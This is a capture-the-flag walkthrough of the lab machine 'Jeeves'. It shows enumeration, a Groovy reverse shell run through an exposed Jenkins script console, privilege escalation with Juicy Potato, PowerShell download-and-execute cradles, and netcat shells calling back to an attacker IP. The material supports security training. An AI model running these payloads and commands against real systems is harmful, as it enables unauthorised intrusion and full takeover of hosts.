# Jeeves
## Reconnaissance
### Initial Port Scan
```bash
sudo /opt/nampAutomator/nmapAutomator.sh 10.10.10.63 All
```
* Result

![1](https://user-images.githubusercontent.com/53956303/132596160-6145db1d-00a5-4968-8b74-79cece481e71.jpg)
## Enumeration
## Port 80
![2_Port80](https://user-images.githubusercontent.com/53956303/132596167-477ea9b7-2cdf-40f1-9f25-4a7726c7e26a.jpg)
* When enter something, an image of MySQL error message is found. Not the actual error message from the server
    * It can be an rabbit hole
## Port 50000
![3_Port50000](https://user-images.githubusercontent.com/53956303/132596175-a0d5ca75-bf54-4d06-b935-c823edeadd04.jpg)
### dirb on Port 50000
```bash
dirb http://10.10.10.63:50000
```
* Result

![4_dirb](https://user-images.githubusercontent.com/53956303/132596180-e2f2b89f-acfc-41cd-9204-d8325f013a84.jpg)
* From the result, an interesting uncommon directory name "askjeeves" is found
### /askjeeves
* From **/askjeeves** on Port 50000, a Jenkins dashboard is found

![4_jenkins](https://user-images.githubusercontent.com/53956303/132596516-184863c2-bfa9-48e6-a06b-8e5dbb03615d.jpg)

## Exploitation
* Since the Jenkins has a script console that executes a code, It might be used to get a reverse shell

![5_script_console](https://user-images.githubusercontent.com/53956303/132596637-c4b8e938-f6a1-4ccd-b886-563de9412940.jpg)

### Getting a Revers shell
#### Open a Necat Listener
```bash
sudo nc -lnvp 443
```
#### Run a groovy command on "Manage Jenkins => Script Console"
|[Pure Groovy/Java Reverse shell - Jenkins Console](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)|
|----|
```bash
String host="10.10.14.19";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
* As a result, a reverse shell as "jeeves\kohsuke" is open
## Privilege Escalation
### Run Windows-exploit-suggester on Kali
* Copy the system info from the target machine and save the system info into "jeeves.txt"

![5_systeminfo](https://user-images.githubusercontent.com/53956303/132596195-f033ae94-4ff4-4dbd-88fc-9a70d94bb53c.jpg)
```bash
./windows-exploit-suggester.py --database 2021-02-09-mssb.xls --systeminfo jeeves.txt
```
* From the result, an exploit `MS16-075` is found

![6_MS16-075](https://user-images.githubusercontent.com/53956303/132596205-4bbad1aa-c9f8-4711-ad8d-921e9c04ff5f.jpg)
## Juicy Potato
#### Preparation
**1. Modify Invoke-PowerShellTCP.ps1 to get a reverse shell back**
```bash
cp ~/Desktop/tools/nishang/Shell/Invoke-PowerShellTCP.ps1 .
mv Invoke-PowerShellTCP.ps1 shell.ps1
```
* Add this line at the bottom to get a reverse shell back
```bash
Invoke-PowerShellTCP -Reverse -IPAddress 10.10.14.29 -Port 1234
```
**2. Make a *Shell.bat* to download and execute *shell.ps1***
```bash
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.29/shell.ps1')
```
**3. Transfer files to the target machine**
* Open a python http server
```bash
mv ~/Desktop/tools/JuicyPotato.exe .
sudo python3 -m http.server 80
```
* Download files on Target machine
```bash
powershell -c iex(new-object net.webclient).downloadfile('http://10.10.14.19/shell.bat', 'C:\Users\kohsuke\Desktop\shell.bat')

powershell -c iex(new-object net.webclient).downloadfile('http://10.10.14.19/jp.exe', 'C:\Users\kohsuke\Desktop\jp.exe')
```
### Execute the Juicy Potato
* Start a netcat listener on Kali
```bash
sudo nc -lnvp 443
```
#### Find a CLSID for an OS
|[juicy-potato/CLSID at master · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID)|
|----|
* Try CLSIDs until the exploit works
#### Execute the Juicy Potato
* -t: create process call. use * to test both options
* -p: the program to run. use shell.bat
* -l: COM server listen port. This can be anything.
* -c: CLSID for an OS
```bash
jp.exe -t * -p shell.bat -l 4444 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```
* As a result, a "nt authority/system" shell is open
### Getting a cmd shell to find a flag
```bash
powershell -c iex(new-object net.webclient).downloadfile('http://10.10.14.19/nc.exe', 'C:\Users\Administrator\Desktop\nc.exe')
```
#### Open a Netcat Listener
```bash
sudo nc -lnvp 443
```
#### Execute the nc.exe to get a cmd shell
```bash
.\nc.exe 10.10.14.19 443 -e cmd.exe
```
* As a result, a cmd shell as `nt authority\system` is open

### Use Alternate Data Stream (NTFS) to find a hidden flag
* dir /a is only for hidden files
```bash
dir /R
```
* Result

![7_hidden](https://user-images.githubusercontent.com/53956303/132596239-59e1934d-0b7f-495f-bf6d-7ca5ab4e6b85.jpg)
* The "hm.txt:root.txt:$DATA" means that the file root.txt is inside an alternate data stream inside "hm.txt"
### Use "more" command to see the alternate data stream
```bash
more < hm.txt:root.txt
```
* As a result, the root flag is found

![8_Root_LI](https://user-images.githubusercontent.com/53956303/132596343-59a7727b-17fb-4527-860d-fc8ae8eeb47e.jpg)
